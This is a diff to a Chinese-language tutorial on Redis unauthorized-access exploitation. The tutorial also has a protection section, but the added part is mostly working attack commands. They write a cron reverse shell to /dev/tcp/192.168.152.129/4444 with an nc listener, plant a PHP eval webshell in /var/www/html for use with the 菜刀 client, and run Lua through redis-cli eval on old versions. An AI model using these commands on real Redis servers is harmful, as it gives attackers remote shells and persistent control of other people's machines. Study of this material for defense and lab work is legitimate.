@@ -105,10 +105,73 @@ config set dbfilename authorized_keys
 
 ```
 ssh root@10.100.50.75
-
 ```
 
 ---
+
+#### 其他利用方式1：在crontab里写定时任务，反弹shell
+
+原理是和写公钥一样的，只是变换一下写入的内容和路径，数据库名。
+
+首先在客户端这边监听一个端口（随便一个端口就好，不要冲突就好）
+
+```
+nc -l 4444
+```
+
+连接redis，写入反弹shell
+
+```
+./redis-cli -h 192.168.152.128
+set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.152.129/4444 0>&1\n\n"
+config set dir /var/spool/cron
+config set dbfilename root
+save
+
+```
+
+#### 其他利用方式2：在web目录下写入webshell
+
+通过redis在指定的web目录下写入一句话木马，用菜刀连接可达到控制服务器的目的。
+
+远程连接redis，写入webshell
+
+```
+./redis-cli -h 192.168.152.128
+config set dir /var/www/html
+set xxx "\n\n\n<?php @eval($_POST['c']);?>\n\n\n"
+config set dbfilename webshell.php
+save
+```
+
+用菜刀连接：
+
+![](/assets/redis-10.png)
+
+用菜刀打开虚拟终端执行命令
+
+#### 其他利用方式2：利用redis执行命令\(低版本\)
+
+**redis 2.6以前**的版本内置了lua脚本环境，在有连接redis服务器的权限下，可以利用lua执行系统命令。
+
+本地建立一个lua脚本
+
+```
+vim  hello.lua
+
+local msg = "hello,hack!"
+return msg
+```
+
+在客户端连接redis服务器并执行hello.lua
+
+```
+./redis-cli eval "$(cat hello.lua)" 0 -h 192.168.152.128
+```
+
+![](/assets/redis-12.png)
+
+
 
 ## 四. Redis未授权访问漏洞的防护
 
@@ -170,13 +233,9 @@ chattr +i ~/.ssh
 
 如果需要添加新的公钥，需要移除`authorized_keys`的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上immutable位权限
 
-
-
 参考链接
 
 [https://www.freebuf.com/column/158065.html](https://www.freebuf.com/column/158065.html)
 
 [https://www.cnblogs.com/ECJTUACM-873284962/p/9561993.html](https://www.cnblogs.com/ECJTUACM-873284962/p/9561993.html)
-
-
 
